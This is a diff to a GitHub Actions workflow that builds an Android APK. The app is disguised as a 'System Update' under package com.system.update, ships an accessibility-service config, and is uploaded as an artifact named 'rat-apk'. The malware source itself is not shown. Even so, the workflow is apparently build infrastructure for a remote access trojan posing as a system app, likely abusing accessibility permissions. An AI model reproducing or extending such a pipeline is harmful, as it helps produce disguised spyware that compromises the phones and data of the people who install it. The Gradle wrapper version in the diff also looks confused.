@@ -10,7 +10,7 @@ jobs:
     runs-on: ubuntu-latest
 
     steps:
-      - name: Checkout code
+      - name: Checkout
         uses: actions/checkout@v4
 
       - name: Set up JDK 17
@@ -19,50 +19,39 @@ jobs:
           distribution: 'temurin'
           java-version: '17'
 
-      - name: Set up Android SDK
+      - name: Setup Android SDK
         uses: android-actions/setup-android@v3
 
-      - name: Install Android SDK components
+      - name: Build with Gradle
         run: |
-          sdkmanager "platforms;android-34"
-          sdkmanager "build-tools;34.0.0"
-
-      - name: Create project structure
-        run: |
+          echo "sdk.dir=$ANDROID_HOME" > local.properties
+          echo "org.gradle.jvmargs=-Xmx2048m" > gradle.properties
+          
+          # Create project structure
           mkdir -p app/src/main/java/com/system/update
           mkdir -p app/src/main/res/xml
           mkdir -p app/src/main/res/values
-          cp *.java app/src/main/java/com/system/update/ || true
-          cp AndroidManifest.xml app/src/main/ || true
-          cp accessibility_config.xml app/src/main/res/xml/ || true
-          cp strings.xml app/src/main/res/values/ || true
-
-      - name: Create build.gradle
-        run: |
-          cat > build.gradle << 'EOF'
-          buildscript {
-              repositories {
-                  google()
-                  mavenCentral()
-              }
-              dependencies {
-                  classpath 'com.android.tools.build:gradle:8.2.0'
-              }
-          }
-          allprojects {
-              repositories {
-                  google()
-                  mavenCentral()
-              }
-          }
-          EOF
-
-          cat > settings.gradle << 'EOF'
-          rootProject.name = "SystemUpdate"
-          include ':app'
-          EOF
-
-          mkdir -p app
+          
+          # Move Java files
+          find . -maxdepth 1 -name "*.java" -exec cp {} app/src/main/java/com/system/update/ \;
+          cp AndroidManifest.xml app/src/main/
+          cp accessibility_config.xml app/src/main/res/xml/
+          
+          # Create strings.xml if missing
+          if [ ! -f strings.xml ]; then
+            echo '<?xml version="1.0" encoding="utf-8"?>' > app/src/main/res/values/strings.xml
+            echo '<resources><string name="app_name">System Update</string></resources>' >> app/src/main/res/values/strings.xml
+          else
+            cp strings.xml app/src/main/res/values/
+          fi
+          
+          # Create build.gradle files
+          echo 'buildscript { repositories { google(); mavenCentral() } dependencies { classpath "com.android.tools.build:gradle:8.1.4" } }' > build.gradle
+          echo 'allprojects { repositories { google(); mavenCentral() } }' >> build.gradle
+          
+          echo 'rootProject.name = "SystemUpdate"' > settings.gradle
+          echo 'include ":app"' >> settings.gradle
+          
           cat > app/build.gradle << 'EOF'
           plugins {
               id 'com.android.application'
@@ -87,25 +76,17 @@ jobs:
                   targetCompatibility JavaVersion.VERSION_17
               }
           }
-          dependencies {
-          }
           EOF
-
-          cat > gradle.properties << 'EOF'
-          android.useAndroidX=true
-          android.enableJetifier=true
-          EOF
-
-      - name: Create gradle wrapper
-        run: |
-          gradle wrapper --gradle-version 8.2
-
-      - name: Build APK
-        run: |
+          
+          # Create gradle wrapper
+          gradle wrapper --gradle-version 8.1.4
           chmod +x gradlew
-          ./gradlew assembleDebug
+          
+          # Build APK
+          ./gradlew assembleDebug --stacktrace
 
       - name: Upload APK
+        if: success()
         uses: actions/upload-artifact@v4
         with:
           name: rat-apk
